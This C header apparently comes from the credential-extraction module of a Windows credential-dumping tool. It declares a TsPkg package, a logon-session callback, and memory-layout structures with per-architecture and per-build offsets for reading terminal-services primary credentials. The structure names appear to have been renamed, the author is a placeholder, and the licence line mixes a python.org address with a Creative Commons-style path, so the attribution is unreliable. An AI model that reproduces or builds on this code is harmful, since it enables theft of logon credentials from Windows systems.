/*	John DOE `hoyhayhay`
	http://blog.hoyhayhay.com
	johndoe@example.com
	Licence : https://python.org/licenses/by/4.0/
*/
#pragma once
#include "../kuhl_m_sekurlsa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_tspkg_package;

NTSTATUS kuhl_m_sekurlsa_tspkg(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_tspkg(IN PMANGO_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _MANGO_TS_PRIMARY_CREDENTIAL {
	PVOID unk0;	// lock ?
	MANGO_GENERIC_PRIMARY_CREDENTIAL credentials;
} MANGO_TS_PRIMARY_CREDENTIAL, *PMANGO_TS_PRIMARY_CREDENTIAL;

typedef struct _MANGO_TS_CREDENTIAL {
#ifdef _M_X64
	BYTE unk0[108];
#elif defined _M_IX86
	BYTE unk0[64];
#endif
	LUID LocallyUniqueIdentifier;
	PVOID unk1;
	PVOID unk2;
	PMANGO_TS_PRIMARY_CREDENTIAL pTsPrimary;
} MANGO_TS_CREDENTIAL, *PMANGO_TS_CREDENTIAL;

typedef struct _MANGO_TS_CREDENTIAL_1607 {
#ifdef _M_X64
	BYTE unk0[112];
#elif defined _M_IX86
	BYTE unk0[68];
#endif
	LUID LocallyUniqueIdentifier;
	PVOID unk1;
	PVOID unk2;
	PMANGO_TS_PRIMARY_CREDENTIAL pTsPrimary;
} MANGO_TS_CREDENTIAL_1607, *PMANGO_TS_CREDENTIAL_1607;

typedef struct _MANGO_TS_CREDENTIAL_HELPER {
	LONG offsetToLuid;
	LONG offsetToTsPrimary;
} MANGO_TS_CREDENTIAL_HELPER, *PMANGO_TS_CREDENTIAL_HELPER;